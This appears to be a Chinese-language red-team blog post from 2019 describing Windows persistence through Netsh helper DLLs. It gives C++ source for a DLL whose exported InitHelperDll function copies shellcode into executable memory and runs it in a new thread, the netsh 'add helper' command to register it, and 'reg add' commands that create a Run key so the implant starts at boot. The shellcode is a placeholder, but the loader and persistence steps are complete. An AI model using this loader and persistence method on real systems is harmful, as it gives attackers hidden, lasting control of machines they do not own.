---
layout:     post
title:    Windows权限维持-Netsh
subtitle:   Windows权限维持-Netsh
date:       2019-11-21
author:     hmoytx
header-img: img/bg_02.jpg
catalog: true
tags:
    - 渗透测试
    - 红队
    - 内网渗透
    - 权限维持
---
# Windows权限维持-Netsh

## 简介
Netsh是Windows中用于网络配置命令工具，管理员可以使用它来执行与系统的网络配置有关的任务，可以用来配置防火墙策略用于转发。Netsh可以通过使用DLL文件来扩展自身的功能，基于此功能可以用来加载任意DLL，实现权限维持。  

## DLL
这里的dll是用来加载的，跟直接用rundll32调用的是有区别的。这里给出函数原型：  
```
DWORD
WINAPI
InitHelperDll(
    DWORD      dwNetshVersion,
    PVOID      pReserved
)
```
然后用vs创建一个dll项目，根据这个原型，将执行内容换成之前静态免杀中使用的加载shellcode的形式。  
```
#include <windows.h>

unsigned char shellcode[] ="xxxxxxxxxxxxxxxx";

extern "C" __declspec(dllexport) DWORD InitHelperDll(DWORD      dwNetshVersion, PVOID pReserved)
{
    ((void(*)(void))&shellcode)();
}

```
稍微改写下。 
```
…………
DWORD WINAPI RunCode(LPVOID lpParameter)
{
    unsigned char shellcode[] =“xxxxxxxxxx”;
    LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(Memory, shellcode, sizeof(shellcode));
    ((void(*)())Memory)();
    return 1;
}  

extern "C" __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID
pReserved)
{
    HANDLE hand;
    hand = CreateThread(NULL, 0, RunCode, NULL, 0, NULL);
    CloseHandle(hand);
    return NO_ERROR;
}
``` 
编译出来。  

###  添加HelperDll
在命令行中运行netsh添加dll。  
```
C:\>netsh
netsh>add helper path\xx.dll
```
![191128_1](/img/addhelper.png)  
添加后，会在注册表中多一项：   
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh
```
![191128_2](/img/191128_reg.png)  
然后只要每次运行netsh，就会上线。  
![191128_3](/img/beacon.png)  
不过默认情况下，netsh不是自启动的需要在注册表中创建一下，以保证持久性。  
```
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v
NetshStart /t REG_SZ /d "C:\Windows\SysWOW64\netsh"
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run\\ -v
NetshStart -d 'C:\Windows\SysWOW64\netsh'
```  


### 补充
在有些机器上含有代理工具的，似乎是不需要添加netsh为自启的。  